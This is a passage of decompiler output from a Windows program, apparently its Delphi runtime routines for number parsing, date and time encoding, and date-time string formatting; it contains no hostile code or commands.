          pcVar1 = (char *)((int)unaff_EBX + uVar4 + 2);
          *pcVar1 = *pcVar1 + '\x01';
          iVar6 = uVar4 + 2;
          uVar4 = uVar4 - 1;
        } while (0x39 < *(byte *)((int)unaff_EBX + iVar6));
      }
      else {
        uVar4 = 0x12;
LAB_00409482:
        do {
          *(undefined *)((int)unaff_EBX + uVar4 + 3) = 0;
          if ((int)(uVar4 - 1) < 0) {
            bVar9 = 0;
            goto LAB_00409495;
          }
          iVar6 = uVar4 + 2;
          uVar4 = uVar4 - 1;
        } while (*(char *)((int)unaff_EBX + iVar6) == '0');
      }
      bVar9 = (byte)((ushort)*(undefined2 *)((int)unaff_ESI + 8) >> 8);
LAB_00409495:
      uVar3 = (undefined2)*(undefined4 *)(unaff_EBP + -8);
      goto LAB_00409498;
    }
    if (((*(ushort *)((int)unaff_ESI + 6) & 0x8000) != 0) &&
       ((*(int *)unaff_ESI != 0 || (*(int *)((int)unaff_ESI + 4) != -0x80000000)))) {
      uVar4 = 0x8000;
      goto LAB_004093c0;
    }
  }
  bVar9 = (byte)(uVar5 >> 8);
  uVar3 = (undefined2)uVar4;
  *(undefined *)((int)unaff_EBX + 3) = 0;
LAB_00409498:
  *unaff_EBX = uVar3;
  *(byte *)(unaff_EBX + 1) = bVar9 >> 7;
  return;
}



void FUN_004094b7(void)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  byte bVar7;
  ushort uVar4;
  short sVar5;
  uint uVar6;
  int iVar8;
  byte bVar9;
  uint uVar10;
  short *unaff_EBX;
  int unaff_EBP;
  uint *unaff_ESI;
  int iVar11;
  short *psVar12;
  short *psVar13;
  bool bVar14;
  float10 fVar15;
  
  uVar6 = *unaff_ESI;
  uVar10 = unaff_ESI[1];
  if ((uVar6 | uVar10) != 0) {
    if ((int)uVar10 < 0) {
      bVar14 = uVar6 != 0;
      uVar6 = -uVar6;
      uVar10 = -(uint)bVar14 - uVar10;
    }
    iVar8 = 0;
    iVar11 = *(int *)(unaff_EBP + 8);
    if (iVar11 < 0) {
      iVar11 = 0;
    }
    if (3 < iVar11) {
      iVar11 = 4;
      uVar2 = uVar6;
      iVar3 = iVar8;
      do {
        iVar8 = iVar3;
        uVar6 = uVar2;
        bVar14 = 0xde0b6b2 < uVar10;
        uVar1 = uVar10 + 0xf21f494d;
        uVar10 = uVar1 - (uVar6 < 0xa7640000);
        uVar2 = uVar6 + 0x589c0000;
        iVar3 = iVar8 + 1;
      } while (bVar14 && (uVar6 < 0xa7640000) <= uVar1);
      uVar10 = uVar10 + 0xde0b6b3 + (uint)(0x589bffff < uVar6 + 0x589c0000);
    }
    *(uint *)(unaff_EBP + -0x20) = uVar6;
    *(uint *)(unaff_EBP + -0x1c) = uVar10;
    fVar15 = (float10)*(longlong *)(unaff_EBP + -0x20);
    if (4 - iVar11 != 0) {
      fVar15 = fVar15 / (float10)*(int *)(*(int *)(unaff_EBP + -4) + 0x4094a3 + (4 - iVar11) * 4);
    }
    *(float10 *)(unaff_EBP + -0x18) = fVar15;
    psVar12 = (short *)((int)unaff_EBX + 3);
    if (iVar8 != 0) {
      psVar13 = unaff_EBX + 2;
      *(char *)psVar12 = (char)iVar8 + '0';
      iVar8 = 9;
      goto LAB_0040954e;
    }
    iVar8 = 9;
    do {
      bVar9 = *(byte *)(iVar8 + -0x19 + unaff_EBP);
      uVar4 = CONCAT11(bVar9,bVar9 >> 4);
      psVar13 = psVar12;
      if (bVar9 >> 4 != 0) goto LAB_00409557;
      bVar7 = (byte)((uint)uVar4 >> 8);
      if ((bVar9 & 0xf) != 0) goto LAB_0040955e;
      iVar8 = iVar8 + -1;
    } while (iVar8 != 0);
  }
  sVar5 = 0;
  bVar9 = 0;
  *(undefined *)((int)unaff_EBX + 3) = 0;
LAB_00409584:
  *unaff_EBX = sVar5;
  *(byte *)(unaff_EBX + 1) = bVar9;
  return;
LAB_0040955e:
  while( true ) {
    psVar13 = (short *)((int)psVar12 + 1);
    *(byte *)psVar12 = (bVar7 & 0xf) + 0x30;
    iVar8 = iVar8 + -1;
    if (iVar8 == 0) break;
LAB_0040954e:
    bVar9 = *(byte *)(iVar8 + -0x19 + unaff_EBP);
    uVar4 = CONCAT11(bVar9,bVar9 >> 4);
LAB_00409557:
    bVar7 = (byte)(uVar4 >> 8);
    psVar12 = (short *)((int)psVar13 + 1);
    *(char *)psVar13 = (char)uVar4 + '0';
  }
  sVar5 = (short)psVar13 - ((short)unaff_EBX + 3 + (short)iVar11);
  do {
    *(char *)psVar13 = '\0';
    psVar13 = (short *)((int)psVar13 + -1);
  } while (*(char *)psVar13 == '0');
  bVar9 = (byte)(unaff_ESI[1] >> 0x1f);
  goto LAB_00409584;
}



undefined4 FUN_00409594(byte *param_1,float10 *param_2,char param_3)

{
  byte bVar1;
  byte bVar2;
  undefined2 extraout_var;
  byte *extraout_ECX;
  byte *extraout_ECX_00;
  byte *pbVar3;
  ushort in_FPUStatusWord;
  ushort uVar4;
  float10 fVar5;
  
  bVar2 = DAT_0044267f;
  uVar4 = (in_FPUStatusWord >> 8 & 0x7f) << 8;
  fVar5 = (float10)0;
  FUN_0040964b();
  bVar1 = *param_1;
  if ((bVar1 == 0x2b) || (bVar1 == 0x2d)) {
    param_1 = param_1 + 1;
  }
  FUN_00409656();
  pbVar3 = extraout_ECX;
  if (*param_1 == bVar2) {
    param_1 = param_1 + 1;
    FUN_00409656();
    pbVar3 = extraout_ECX_00;
  }
  if (pbVar3 != param_1) {
    if ((*param_1 & 0xdf) == 0x45) {
      param_1 = param_1 + 1;
      FUN_00409672();
    }
    FUN_0040964b();
    if (*param_1 == 0) {
      thunk_FUN_004036a0();
      if (bVar1 == 0x2d) {
        fVar5 = -fVar5;
      }
      if (param_3 == '\0') {
        *param_2 = fVar5;
      }
      else {
        *(longlong *)param_2 = (longlong)ROUND(fVar5);
      }
      if ((uVar4 & 9) == 0) {
        return CONCAT31((int3)(CONCAT22(extraout_var,uVar4) >> 8),1);
      }
    }
  }
  return 0;
}



void FUN_0040964b(void)

{
  char cVar1;
  char *unaff_ESI;
  
  do {
    cVar1 = *unaff_ESI;
    if (cVar1 == '\0') {
      return;
    }
    unaff_ESI = unaff_ESI + 1;
  } while (cVar1 == ' ');
  return;
}



void FUN_00409656(void)

{
  int unaff_EBP;
  char *unaff_ESI;
  
  while( true ) {
    if ((byte)(*unaff_ESI - 0x3aU) < 0xf6) break;
    *(uint *)(unaff_EBP + -0xc) = (uint)(byte)(*unaff_ESI - 0x30);
    unaff_ESI = unaff_ESI + 1;
  }
  return;
}



void FUN_00409672(void)

{
  char cVar1;
  uint uVar2;
  char *unaff_ESI;
  
  uVar2 = 0;
  if ((*unaff_ESI == '+') || (*unaff_ESI == '-')) {
    unaff_ESI = unaff_ESI + 1;
  }
  do {
    cVar1 = *unaff_ESI;
    if ((byte)(cVar1 - 0x3aU) < 0xf6) {
      return;
    }
    unaff_ESI = unaff_ESI + 1;
    uVar2 = uVar2 * 10 + (uint)(byte)(cVar1 - 0x30);
  } while (uVar2 < 500);
  return;
}



void FUN_004096a8(int *param_1,undefined param_2,undefined param_3,undefined param_4)

{
  uint uVar1;
  undefined4 local_44 [16];
  
  uVar1 = FUN_00409094((undefined *)local_44,&param_4,'\0',0,0xf,0);
  FUN_00404898(param_1,local_44,uVar1);
  return;
}



void FUN_004096d8(int *param_1,undefined param_2,undefined param_3,undefined param_4)

{
  uint uVar1;
  undefined4 local_44 [16];
  
  uVar1 = FUN_00409094((undefined *)local_44,&param_4,'\x01',0,0,0);
  FUN_00404898(param_1,local_44,uVar1);
  return;
}



void FUN_00409708(undefined *param_1,float10 *param_2)

{
  byte *pbVar1;
  
  pbVar1 = FUN_00404c68(param_1);
  FUN_00409594(pbVar1,param_2,'\0');
  return;
}



void FUN_00409724(undefined *param_1,double *param_2)

{
  byte *pbVar1;
  undefined4 uVar2;
  float10 local_14;
  
  pbVar1 = FUN_00404c68(param_1);
  uVar2 = FUN_00409594(pbVar1,&local_14,'\0');
  if ((char)uVar2 != '\0') {
    *param_2 = (double)local_14;
  }
  return;
}



void FUN_00409750(undefined *param_1,float *param_2)

{
  byte *pbVar1;
  undefined4 uVar2;
  float10 local_14;
  
  pbVar1 = FUN_00404c68(param_1);
  uVar2 = FUN_00409594(pbVar1,&local_14,'\0');
  if ((char)uVar2 != '\0') {
    *param_2 = (float)local_14;
  }
  return;
}



void FUN_0040977c(undefined *param_1,float10 *param_2)

{
  byte *pbVar1;
  
  pbVar1 = FUN_00404c68(param_1);
  FUN_00409594(pbVar1,param_2,'\x01');
  return;
}



void FUN_00409798(undefined4 *param_1,undefined4 param_2,undefined4 param_3,double param_4)

{
  ulonglong uVar1;
  int iVar2;
  undefined4 uVar3;
  int local_10;
  int iStack12;
  
  uVar1 = (ulonglong)ROUND(param_4 * (double)DAT_0043f1a0);
  local_10 = (int)uVar1;
  iStack12 = (int)(uVar1 >> 0x20);
  if ((longlong)uVar1 < 0) {
    uVar1 = CONCAT44(-(uint)(local_10 != 0) - iStack12,-local_10);
    uVar3 = (undefined4)(uVar1 % (ulonglong)DAT_0043f1a4);
    iVar2 = -(int)(uVar1 / DAT_0043f1a4);
  }
  else {
    iVar2 = (int)(uVar1 / DAT_0043f1a4);
    uVar3 = (undefined4)(uVar1 % (ulonglong)DAT_0043f1a4);
  }
  *param_1 = uVar3;
  param_1[1] = iVar2 + 0xa955a;
  return;
}



uint FUN_004097dc(double *param_1,ushort param_2,ushort param_3,double *param_4,ushort param_5)

{
  byte local_5;
  
  local_5 = 0;
  if (((((ushort)param_1 < 0x18) && (param_2 < 0x3c)) && (param_3 < 0x3c)) && (param_5 < 1000)) {
    *param_4 = (double)((float)(((uint)param_1 & 0xffff) * 3600000 + (uint)param_2 * 60000 +
                                (uint)param_3 * 1000 + (uint)param_5) / 8.64e+07);
    local_5 = 1;
    param_1 = param_4;
  }
  return (uint)param_1 & 0xffffff00 | (uint)local_5;
}



void FUN_0040984c(double *param_1,ushort param_2,ushort param_3,ushort param_4)

{
  uint uVar1;
  double local_c;
  
  uVar1 = FUN_004097dc(param_1,param_2,param_3,&local_c,param_4);
  if ((char)uVar1 == '\0') {
    FUN_00407d78((int **)PTR_PTR_DAT_00441488);
  }
  return;
}



void FUN_0040988c(undefined2 *param_1,undefined2 *param_2,undefined2 *param_3,undefined2 *param_4,
                 undefined4 param_5,undefined4 param_6)

{
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  undefined2 extraout_var_01;
  ushort *puVar1;
  uint local_10 [2];
  ushort local_8;
  ushort local_6;
  
  puVar1 = &local_8;
  FUN_00409798(local_10,param_2,param_3,(double)CONCAT44(param_6,param_5));
  FUN_00407d5c(local_10[0],CONCAT22(extraout_var,60000),&local_6,puVar1);
  FUN_00407d5c((uint)local_6,CONCAT22(extraout_var_00,0x3c),param_1,param_2);
  FUN_00407d5c((uint)local_8,CONCAT22(extraout_var_01,1000),param_3,param_4);
  return;
}



undefined4 FUN_004098e8(uint param_1)

{
  uint uVar1;
  uint uVar2;
  
  if ((param_1 & 3) == 0) {
    uVar2 = param_1 & 0xffff;
    uVar1 = 100;
    if ((uVar2 % 100 != 0) || (uVar1 = 400, uVar2 % 400 == 0)) {
      return CONCAT31((int3)(uVar2 / uVar1 >> 8),1);
    }
  }
  return 0;
}



uint FUN_00409924(uint param_1,ushort param_2,ushort param_3,double *param_4)

{
  ushort *puVar1;
  uint uVar2;
  int iVar3;
  double *pdVar4;
  int iVar5;
  int iVar6;
  byte local_7;
  
  local_7 = 0;
  uVar2 = FUN_004098e8(param_1);
  pdVar4 = (double *)((uVar2 & 0x7f) * 3);
  iVar6 = (uVar2 & 0x7f) * 0x18;
  if (((((ushort)param_1 != 0) && ((ushort)param_1 < 10000)) && (param_2 != 0)) &&
     (((param_2 < 0xd && (param_3 != 0)) &&
      (puVar1 = (ushort *)(iVar6 + 0x43f102 + (int)(double *)(uint)param_2 * 2),
      pdVar4 = (double *)(uint)param_2, param_3 < *puVar1 || param_3 == *puVar1)))) {
    iVar3 = param_2 - 1;
    if (0 < iVar3) {
      iVar5 = 1;
      do {
        param_3 = param_3 + *(short *)(iVar6 + 0x43f102 + iVar5 * 2);
        iVar5 = iVar5 + 1;
        iVar3 = iVar3 + -1;
      } while (iVar3 != 0);
    }
    iVar3 = (param_1 & 0xffff) - 1;
    iVar6 = iVar3;
    if (iVar3 < 0) {
      iVar6 = (param_1 & 0xffff) + 2;
    }
    *param_4 = (double)(((iVar3 * 0x16d + (iVar6 >> 2)) - iVar3 / 100) + iVar3 / 400 + (uint)param_3
                       + -0xa955a);
    local_7 = 1;
    pdVar4 = param_4;
  }
  return (uint)pdVar4 & 0xffffff00 | (uint)local_7;
}



void FUN_004099ec(uint param_1,ushort param_2,ushort param_3)

{
  uint uVar1;
  double local_14;
  
  uVar1 = FUN_00409924(param_1,param_2,param_3,&local_14);
  if ((char)uVar1 == '\0') {
    FUN_00407d78((int **)PTR_PTR_DAT_00441510);
  }
  return;
}



uint FUN_00409a1c(ushort *param_1,ushort *param_2,short *param_3,undefined2 *param_4,
                 undefined4 param_5,undefined4 param_6)

{
  ushort uVar1;
  short sVar2;
  short sVar3;
  ushort uVar4;
  uint uVar5;
  int iVar6;
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  short sVar7;
  ushort uVar8;
  undefined4 local_1c;
  int local_18;
  short local_14;
  ushort local_12;
  short *local_10;
  ushort *local_c;
  ushort *local_8;
  
  local_10 = param_3;
  local_c = param_2;
  local_8 = param_1;
  FUN_00409798(&local_1c,param_2,param_3,(double)CONCAT44(param_6,param_5));
  if (local_18 < 1) {
    *local_8 = 0;
    *local_c = 0;
    *local_10 = 0;
    *param_4 = 0;
    uVar5 = 0;
  }
  else {
    iVar6 = local_18 % 7 + 1;
    *param_4 = (short)iVar6;
    sVar7 = 1;
    for (uVar5 = local_18 - 1; 0x23ab0 < (int)uVar5; uVar5 = uVar5 - 0x23ab1) {
      sVar7 = sVar7 + 400;
    }
    FUN_00407d5c(uVar5,CONCAT22((short)((uint)iVar6 >> 0x10),0x8eac),&local_14,&local_12);
    if (local_14 == 4) {
      local_14 = 3;
      local_12 = local_12 + 0x8eac;
    }
    sVar2 = local_14 * 100;
    FUN_00407d5c((uint)local_12,CONCAT22(extraout_var,0x5b5),&local_14,&local_12);
    sVar3 = local_14 * 4;
    FUN_00407d5c((uint)local_12,CONCAT22(extraout_var_00,0x16d),&local_14,&local_12);
    if (local_14 == 4) {
      local_14 = 3;
      local_12 = local_12 + 0x16d;
    }
    uVar8 = sVar7 + sVar2 + sVar3 + local_14;
    uVar5 = FUN_004098e8((uint)param_4 & 0xffff0000 | (uint)uVar8);
    uVar4 = 1;
    for (; uVar1 = *(ushort *)((uVar5 & 0xff) * 0x18 + 0x43f102 + (uint)uVar4 * 2),
        uVar1 <= local_12; local_12 = local_12 - uVar1) {
      uVar4 = uVar4 + 1;
    }
    *local_8 = uVar8;
    *local_c = uVar4;
    *local_10 = local_12 + 1;
  }
  return uVar5;
}



void FUN_00409b68(ushort *param_1,ushort *param_2,short *param_3,undefined4 param_4,
                 undefined4 param_5)

{
  undefined4 uStack8;
  
  uStack8 = param_3;
  FUN_00409a1c(param_1,param_2,param_3,(undefined2 *)((int)&uStack8 + 2),param_4,param_5);
  return;
}



int FUN_00409b88(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                undefined4 param_5)

{
  undefined4 local_c;
  int local_8;
  
  FUN_00409798(&local_c,param_2,param_3,(double)CONCAT44(param_5,param_4));
  return local_8 % 7 + 1;
}



void FUN_00409bb0(void)

{
  LPSYSTEMTIME lpSystemTime;
  undefined2 extraout_var;
  float10 in_ST0;
  _SYSTEMTIME local_18;
  double local_8;
  
  lpSystemTime = &local_18;
  GetLocalTime(lpSystemTime);
  FUN_004099ec((uint)lpSystemTime & 0xffff0000 | (uint)local_18.wYear,local_18.wMonth,local_18.wDay)
  ;
  local_8 = (double)in_ST0;
  FUN_0040984c((double *)CONCAT22(extraout_var,local_18.wHour),local_18.wMinute,local_18.wSecond,
               local_18.wMilliseconds);
  return;
}



WORD FUN_00409c00(void)

{
  _SYSTEMTIME local_10;
  
  GetLocalTime(&local_10);
  return local_10.wYear;
}



void FUN_00409c14(undefined4 *param_1,uint param_2,undefined4 param_3,int param_4)

{
  uint uVar1;
  
  uVar1 = 0x100 - *(int *)(param_4 + -0x104);
  if ((int)param_2 < (int)uVar1) {
    uVar1 = param_2;
  }
  if (uVar1 != 0) {
    FUN_0040285c(param_1,(undefined4 *)(param_4 + -0x100 + *(int *)(param_4 + -0x104)),uVar1);
  }
  *(int *)(param_4 + -0x104) = *(int *)(param_4 + -0x104) + uVar1;
  return;
}



void FUN_00409c58(undefined4 *param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  uint uVar1;
  undefined4 extraout_ECX;
  
  uVar1 = FUN_00404a68((int)param_1);
  FUN_00409c14(param_1,uVar1,extraout_ECX,param_4);
  return;
}



void FUN_00409c78(undefined4 param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  uint uVar1;
  undefined4 extraout_ECX;
  undefined4 local_24;
  undefined local_20;
  undefined4 local_1c;
  undefined local_18;
  undefined4 local_14 [4];
  
  local_20 = 0;
  local_18 = 0;
  local_24 = param_2;
  local_1c = param_1;
  uVar1 = FUN_00408bc4((byte *)local_14,(byte *)0x10,&DAT_0043f1a8,1,&local_24,4);
  FUN_00409c14(local_14,uVar1,extraout_ECX,param_4);
  return;
}



void FUN_00409cc4(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  char *pcVar1;
  char **ppcVar2;
  
  ppcVar2 = (char **)(param_4 + -4);
  pcVar1 = *ppcVar2;
  while (**ppcVar2 == *(char *)(param_4 + -5)) {
    *ppcVar2 = *ppcVar2 + 1;
  }
  *(char **)(param_4 + -0xc) = *ppcVar2 + (1 - (int)pcVar1);
  return;
}



void FUN_00409cf0(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  if (*(char *)(param_4 + -0x13) == '\0') {
    FUN_00409b68((ushort *)(param_4 + -0xe),(ushort *)(param_4 + -0x10),(short *)(param_4 + -0x12),
                 *(undefined4 *)(*(int *)(param_4 + 8) + 8),
                 *(undefined4 *)(*(int *)(param_4 + 8) + 0xc));
    *(undefined *)(param_4 + -0x13) = 1;
  }
  return;
}



void FUN_00409d28(undefined param_1,undefined param_2,undefined param_3,int param_4)

{
  if (*(char *)(param_4 + -0x1d) == '\0') {
    FUN_0040988c((undefined2 *)(param_4 + -0x16),(undefined2 *)(param_4 + -0x18),
                 (undefined2 *)(param_4 + -0x1a),(undefined2 *)(param_4 + -0x1c),
                 *(undefined4 *)(*(int *)(param_4 + 8) + 8),
                 *(undefined4 *)(*(int *)(param_4 + 8) + 0xc));
    *(undefined *)(param_4 + -0x1d) = 1;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00409d68(int param_1,int *param_2,undefined4 param_3,int param_4)

{
  LPCSTR lpFormat;
  LCID Locale;
  uint uVar1;
  undefined4 *in_FS_OFFSET;
  DWORD dwFlags;
  SYSTEMTIME *lpDate;
  undefined4 *puVar2;
  int iVar3;
  int *piVar4;
  undefined4 uStack304;
  undefined *puStack300;
  undefined *puStack296;
  undefined local_11c [4];
  undefined4 local_118 [64];
  SYSTEMTIME local_18;
  undefined *local_8;
  
  puStack296 = &stack0xfffffffc;
  local_11c = (undefined *)0x0;
  local_8 = (undefined *)0x0;
  puStack300 = &LAB_00409eb6;
  uStack304 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack304;
  FUN_004047a8(param_2);
  local_18.wYear = *(WORD *)(param_4 + -0xe);
  local_18.wMonth = *(WORD *)(param_4 + -0x10);
  local_18.wDay = *(WORD *)(param_4 + -0x12);
  FUN_00404840((int *)&local_8,(int)&DAT_00409ecc);
  iVar3 = 0x100;
  puVar2 = local_118;
  lpFormat = FUN_00404c68(local_8);
  lpDate = &local_18;
  dwFlags = 4;
  Locale = GetThreadLocale();
  iVar3 = GetDateFormatA(Locale,dwFlags,lpDate,lpFormat,(LPSTR)puVar2,iVar3);
  if (iVar3 != 0) {
    FUN_00404a18(param_2,local_118,0x100);
    if (param_1 == 1) {
      if (DAT_0044273c == 4) {
        if (_DAT_00442740 == 1) {
          iVar3 = FUN_00404a68(*param_2);
          iVar3 = FUN_0040c1a0((undefined *)*param_2,iVar3);
          if (iVar3 == 4) {
            iVar3 = FUN_0040c2b0((undefined *)*param_2,3);
            puVar2 = (undefined4 *)((int)local_118 + iVar3 + -1);
            FUN_004049a0((int *)local_11c,puVar2);
            uVar1 = FUN_0040c314(local_11c,2);
            FUN_00404898(param_2,puVar2,uVar1);
          }
        }
      }
      else if (DAT_0044273c == 0x11) {
        piVar4 = param_2;
        uVar1 = FUN_0040c314((undefined *)*param_2,1);
        FUN_00404cc8(*param_2,1,uVar1,piVar4);
      }
    }
  }
  *in_FS_OFFSET = uStack304;
  puStack296 = &LAB_00409ebd;
  puStack300 = (undefined *)0x409ead;
  FUN_004047a8((int *)local_11c);
  puStack300 = (undefined *)0x409eb5;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_00409ed0(int param_1,char **param_2,undefined4 param_3,int param_4)

{
  LPCSTR lpFormat;
  LCID Locale;
  undefined4 *in_FS_OFFSET;
  DWORD dwFlags;
  SYSTEMTIME *lpDate;
  undefined4 *lpDateStr;
  int iVar1;
  char **ppcVar2;
  undefined4 uStack300;
  undefined *puStack296;
  undefined *puStack292;
  undefined4 local_118 [64];
  SYSTEMTIME local_18;
  undefined *local_8;
  
  puStack292 = &stack0xfffffffc;
  local_8 = (undefined *)0x0;
  puStack296 = &LAB_00409fae;
  uStack300 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack300;
  FUN_004047a8((int *)param_2);
  local_18.wYear = *(WORD *)(param_4 + -0xe);
  local_18.wMonth = *(WORD *)(param_4 + -0x10);
  local_18.wDay = *(WORD *)(param_4 + -0x12);
  if (param_1 < 3) {
    FUN_00404840((int *)&local_8,(int)&DAT_00409fc4);
  }
  else {
    FUN_00404840((int *)&local_8,(int)&DAT_00409fd0);
  }
  iVar1 = 0x100;
  lpDateStr = local_118;
  lpFormat = FUN_00404c68(local_8);
  lpDate = &local_18;
  dwFlags = 4;
  Locale = GetThreadLocale();
  iVar1 = GetDateFormatA(Locale,dwFlags,lpDate,lpFormat,(LPSTR)lpDateStr,iVar1);
  if (iVar1 != 0) {
    FUN_00404a18((int *)param_2,local_118,0x100);
    if ((param_1 == 1) && (**param_2 == '0')) {
      ppcVar2 = param_2;
      iVar1 = FUN_00404a68((int)*param_2);
      FUN_00404cc8((int)*param_2,2,iVar1 - 1,(int *)ppcVar2);
    }
  }
  *in_FS_OFFSET = uStack300;
  puStack292 = &LAB_00409fb5;
  puStack296 = (undefined *)0x409fad;
  FUN_004047a8((int *)&local_8);
  return;
}



void FUN_00409fd8(undefined4 *param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  byte bVar1;
  undefined uVar2;
  ushort uVar3;
  uint uVar4;
  undefined4 *puVar5;
  int iVar6;
  undefined uVar7;
  undefined extraout_CL;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined *extraout_ECX_03;
  undefined *extraout_ECX_04;
  undefined *extraout_ECX_05;
  undefined *extraout_ECX_06;
  undefined *puVar8;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  undefined4 extraout_ECX_09;
  undefined4 extraout_ECX_10;
  undefined4 extraout_ECX_11;
  undefined4 extraout_ECX_12;
  undefined4 extraout_ECX_13;
  undefined4 uVar9;
  char cVar10;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  undefined extraout_DL_06;
  undefined extraout_DL_07;
  undefined extraout_DL_08;
  undefined extraout_DL_09;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  undefined4 extraout_EDX_06;
  undefined4 extraout_EDX_07;
  undefined4 extraout_EDX_08;
  undefined4 extraout_EDX_09;
  undefined4 extraout_EDX_10;
  undefined4 extraout_EDX_11;
  undefined4 extraout_EDX_12;
  byte bVar11;
  byte bVar12;
  undefined4 *puVar13;
  undefined4 *in_FS_OFFSET;
  undefined uVar14;
  undefined *puVar15;
  undefined4 uStack64;
  undefined *puStack60;
  undefined *puStack56;
  undefined4 *local_2c;
  undefined4 *local_28;
  byte local_23;
  char local_22;
  undefined local_21;
  ushort local_20;
  ushort local_1e;
  ushort local_1c;
  ushort local_1a;
  undefined local_17;
  ushort local_16;
  ushort local_14;
  ushort local_12;
  int local_10;
  byte local_9;
  undefined4 *local_8;
  
  puStack56 = &stack0xfffffffc;
  local_2c = (undefined4 *)0x0;
  local_28 = (undefined4 *)0x0;
  puStack60 = &LAB_0040a759;
  uStack64 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack64;
  local_8 = param_1;
  if ((param_1 != (undefined4 *)0x0) && (*(int *)(param_4 + -0x108) < 2)) {
    *(int *)(param_4 + -0x108) = *(int *)(param_4 + -0x108) + 1;
    local_17 = 0;
    local_21 = 0;
    local_22 = '\0';
    bVar12 = 0x20;
    local_8 = param_1;
    while (bVar1 = *(byte *)local_8, bVar1 != 0) {
      local_9 = bVar1;
      if ((*(byte *)((int)&DAT_0043f134 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0) {
        puVar5 = (undefined4 *)FUN_0040c394((LPCSTR)local_8);
        bVar1 = local_9;
        if ((byte)(local_9 + 0x9f) < 0x1a) {
          bVar1 = local_9 - 0x20;
        }
        cVar10 = bVar1 + 0xa5;
        bVar11 = bVar12;
        if ((((byte)(bVar1 + 0xbf) < 0x1a) && (bVar11 = bVar1, bVar1 == 0x4d)) && (bVar12 == 0x48))
        {
          bVar1 = 0x4e;
          bVar11 = bVar1;
        }
        uVar2 = *(undefined *)(bVar1 + 0x40a099);
        uVar7 = (undefined)extraout_ECX_00;
        bVar12 = bVar11;
        local_8 = puVar5;
        switch(bVar1) {
        case 0x22:
        case 0x27:
          uVar9 = extraout_ECX_00;
          while( true ) {
            bVar1 = *(byte *)local_8;
            if ((bVar1 == 0) || (bVar1 == local_9)) break;
            if ((*(byte *)((int)&DAT_0043f134 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0) {
              local_8 = (undefined4 *)((int)local_8 + 1);
            }
            else {
              local_8 = (undefined4 *)FUN_0040c394((LPCSTR)local_8);
              uVar9 = extraout_ECX_13;
            }
          }
          FUN_00409c14(puVar5,(int)local_8 - (int)puVar5,uVar9,param_4);
          if (*(byte *)local_8 != 0) {
            local_8 = (undefined4 *)((int)local_8 + 1);
          }
          break;
        default:
          FUN_00409c14((undefined4 *)&local_9,1,extraout_ECX_00,param_4);
          break;
        case 0x2f:
          if (DAT_00442681 != '\0') {
            FUN_00409c14((undefined4 *)&DAT_00442681,1,extraout_ECX_00,param_4);
          }
          break;
        case 0x3a:
          if (DAT_0044268c != '\0') {
            FUN_00409c14((undefined4 *)&DAT_0044268c,1,extraout_ECX_00,param_4);
          }
          break;
        case 0x41:
          FUN_00409d28(uVar2,cVar10,uVar7,&stack0xfffffffc);
          puVar5 = local_8;
          puVar13 = (undefined4 *)((int)local_8 + -1);
          iVar6 = FUN_00408a3c((char *)puVar13,"AM/PM",5);
          if (iVar6 == 0) {
            if (0xb < local_1a) {
              puVar13 = (undefined4 *)((int)puVar5 + 2);
            }
            FUN_00409c14(puVar13,2,extraout_ECX_07,param_4);
            local_22 = '\x01';
            local_8 = local_8 + 1;
          }
          else {
            iVar6 = FUN_00408a3c((char *)puVar13,"A/P",3);
            if (iVar6 == 0) {
              if (0xb < local_1a) {
                puVar13 = (undefined4 *)((int)puVar5 + 1);
              }
              FUN_00409c14(puVar13,1,extraout_ECX_08,param_4);
              local_22 = '\x01';
              local_8 = (undefined4 *)((int)local_8 + 2);
            }
            else {
              iVar6 = FUN_00408a3c((char *)puVar13,"AMPM",4);
              if (iVar6 == 0) {
                if (local_1a < 0xc) {
                  FUN_00409c58(DAT_00442690,extraout_EDX_06,extraout_ECX_09,param_4);
                }
                else {
                  FUN_00409c58(DAT_00442694,extraout_EDX_06,extraout_ECX_09,param_4);
                }
                local_22 = '\x01';
                local_8 = (undefined4 *)((int)local_8 + 3);
              }
              else {
                iVar6 = FUN_00408a3c((char *)puVar13,"AAAA",4);
                if (iVar6 == 0) {
                  puVar8 = &stack0xfffffffc;
                  FUN_00409cf0(0,extraout_DL_07,extraout_CL,&stack0xfffffffc);
                  iVar6 = param_4;
                  uVar4 = FUN_00409b88(param_4,extraout_EDX_07,puVar8,*(undefined4 *)(param_4 + 8),
                                       *(undefined4 *)(param_4 + 0xc));
                  FUN_00409c58(*(undefined4 **)(&DAT_00442718 + (uVar4 & 0xffff) * 4),
                               extraout_EDX_08,extraout_ECX_10,iVar6);
                  local_8 = (undefined4 *)((int)local_8 + 3);
                }
                else {
                  iVar6 = FUN_00408a3c((char *)puVar13,"AAA",3);
                  if (iVar6 == 0) {
                    puVar8 = &stack0xfffffffc;
                    FUN_00409cf0(0,extraout_DL_08,(char)extraout_ECX_11,&stack0xfffffffc);
                    iVar6 = param_4;
                    uVar4 = FUN_00409b88(param_4,extraout_EDX_09,puVar8,*(undefined4 *)(param_4 + 8)
                                         ,*(undefined4 *)(param_4 + 0xc));
